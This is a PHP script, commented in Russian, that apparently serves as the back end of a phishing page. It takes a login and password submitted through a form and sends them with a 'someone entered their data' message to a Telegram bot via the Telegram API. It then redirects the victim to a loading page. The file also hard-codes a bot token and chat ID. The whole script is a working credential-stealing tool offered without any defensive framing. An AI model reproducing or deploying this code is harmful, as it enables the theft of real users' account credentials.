<?php



// сюда нужно вписать токен вашего бота
define('TELEGRAM_TOKEN', '2144927996:AAHONj5ADhchMrRnUGvCcjqLPXHU57k5wQY');



// сюда нужно вписать ваш внутренний айдишник
define('TELEGRAM_CHATID', '913467600');
$Namelogin = $_POST['namelogin'];
$Password = $_POST['password'];


$message = '
👑 Кто-то ввёл свои данные  '.PHP_EOL.'
✅ Логин: '.$Namelogin.PHP_EOL.'
✅ Пароль: '.$Password.PHP_EOL.'
';



$botApiToken = '2144927996:AAHONj5ADhchMrRnUGvCcjqLPXHU57k5wQY'; // токен бота

echo header('Location: load.html');

message_to_telegram($message);

// Телеграм Отчет (Отсылает сообщения в телеграмм).
function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}

?>